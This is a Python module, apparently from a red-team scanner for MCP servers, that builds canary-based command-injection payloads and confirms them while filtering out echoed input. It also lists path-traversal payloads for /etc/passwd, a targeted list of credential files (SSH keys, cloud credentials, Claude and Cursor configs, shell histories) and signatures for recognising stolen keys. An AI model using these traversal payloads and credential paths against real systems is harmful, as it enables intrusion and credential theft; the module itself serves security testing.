"""
Confirmación por canario: en vez de asumir explotación por señales indirectas
(timing, tamaño de respuesta), se inyecta un marcador único generado en el
momento y se busca que sobreviva intacto en la respuesta -- pero primero se
eliminan los ecos literales del payload enviado, para no confundir un simple
"echo de mi input" con una ejecución real (ej. un tool que hace
`return f"you sent: {arg}"` no debería contar como command injection).

Portado de mcp-red-team/src/checks/behavioral.ts::testCommandInjection/
testPathTraversal (stripReflections + canario aleatorio).
"""
from __future__ import annotations
import json
import secrets


def new_canary(prefix: str = "ARES_RT") -> str:
    return f"{prefix}_{secrets.token_hex(8)}"


def strip_reflections(text: str, *payloads: str) -> str:
    """Elimina del texto cualquier eco literal de los payloads enviados, para que una
    búsqueda posterior del canario no dé falso positivo por simple reflejo del input.
    También neutraliza variantes re-escapadas (ej. un error de validación tipo pydantic
    que muestra '\\n' en vez del salto de línea real) -- sin esto, un payload con
    caracteres especiales puede "sobrevivir" el strip sin haberse ejecutado nunca."""
    cleaned = text
    for p in payloads:
        if not p:
            continue
        variants = {p, p.strip()}
        # p.strip(): confirmado con un falso positivo real -- un payload tipo
        # "\necho {canary}\n" (deliberado, para quebrar en una línea propia en un
        # shell real) llega AL ECO sin los saltos de línea cuando la libería que lo
        # rechaza normaliza el string antes de citarlo en su propio error (ej. el
        # "unknown url type: '...'" de urllib.parse, que le hace strip() a la url
        # inválida antes de formatear el mensaje). Sin esta variante, ese eco
        # recortado no matcheaba el payload exacto, strip_reflections no lo
        # reconocía como reflejo, y el canario "sobrevivía" el strip sin que el
        # comando se haya ejecutado nunca -- confirmado contra notify_webhook()
        # (solo hace urllib.request, ningún sink de shell) en Campo-Tiro/ares-range.
        try:
            variants.add(p.encode("unicode_escape").decode("ascii"))
        except Exception:
            pass
        try:
            variants.add(json.dumps(p)[1:-1])
        except Exception:
            pass
        for v in variants:
            cleaned = cleaned.replace(v, "")
    return cleaned


def command_injection_payloads(canary: str) -> list[str]:
    return [
        f"; echo {canary}",
        f"| echo {canary}",
        f"$(echo {canary})",
        f"`echo {canary}`",
        f"&& echo {canary}",
        f"|| echo {canary}",
        f"\necho {canary}\n",
        f"'; echo {canary}; '",
        f'"; echo {canary}; "',
        f"; write-output {canary}",                 # PowerShell (targets Windows)
        f"; write-output {canary} #",
        f"$({{echo,{canary}}})",                    # bypass de espacios/blocklist simple
        f"; echo {canary} > /tmp/ares_{canary[-8:]} #",
    ]


PASSWD_CONTENT_SIGNATURES = [
    "root:x:0:0", "root:*:0:0", "daemon:x:1:1", "/bin/bash", "/bin/sh", "nobody:",
]


def path_traversal_payloads() -> list[str]:
    return [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\..\\etc\\passwd",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
    ]


# Rutas de alto valor más allá de /etc/passwd: claves SSH, credenciales cloud,
# y configs de clientes MCP (que a su vez pueden contener tokens de OTROS
# servers) -- el objetivo real de un atacante no es "leer /etc/passwd", es
# robar credenciales reusables. Portado del patrón "credential_harvest" de
# qsag-core (7 categorías de tool poisoning/exfiltración).
CREDENTIAL_HARVEST_PATHS = [
    "~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
    "/root/.ssh/id_rsa", "/home/{user}/.ssh/id_rsa",
    "~/.aws/credentials", "~/.aws/config",
    "~/.config/gcloud/credentials.db", "~/.azure/credentials",
    "~/.cursor/mcp.json",
    "~/.config/claude/claude_desktop_config.json",
    "~/Library/Application Support/Claude/claude_desktop_config.json",
    "~/.docker/config.json",
    "~/.netrc",
    "~/.npmrc",
    "~/.gitconfig",
    "~/.bash_history", "~/.zsh_history",
]


def credential_harvest_traversal_payloads() -> list[str]:
    """Cada ruta de CREDENTIAL_HARVEST_PATHS con y sin traversal explícito
    (algunos servers resuelven '~' o rutas absolutas directo, sin necesitar
    '../' -- si el parámetro no valida NINGUNA restricción, ambas formas
    pueden funcionar)."""
    out = []
    for p in CREDENTIAL_HARVEST_PATHS:
        out.append(p)
        out.append(f"../../../../../../..{p.lstrip('~')}" if p.startswith("~") else f"../../../../../..{p}")
    return out


# (patrón, etiqueta) -- confirma que el contenido devuelto es REALMENTE una
# credencial, no solo que el path "no dio error". Nunca se persiste la
# credencial real en el reporte (engine/reporting/redact.py la redacta).
CREDENTIAL_CONTENT_SIGNATURES = [
    ("-----BEGIN OPENSSH PRIVATE KEY-----", "clave privada SSH (OpenSSH)"),
    ("-----BEGIN RSA PRIVATE KEY-----", "clave privada SSH (RSA)"),
    ("-----BEGIN EC PRIVATE KEY-----", "clave privada SSH (EC)"),
    ("aws_access_key_id", "credenciales AWS CLI"),
    ("aws_secret_access_key", "credenciales AWS CLI"),
    ("\"mcpServers\"", "config de cliente MCP (puede contener tokens de OTROS servers)"),
]
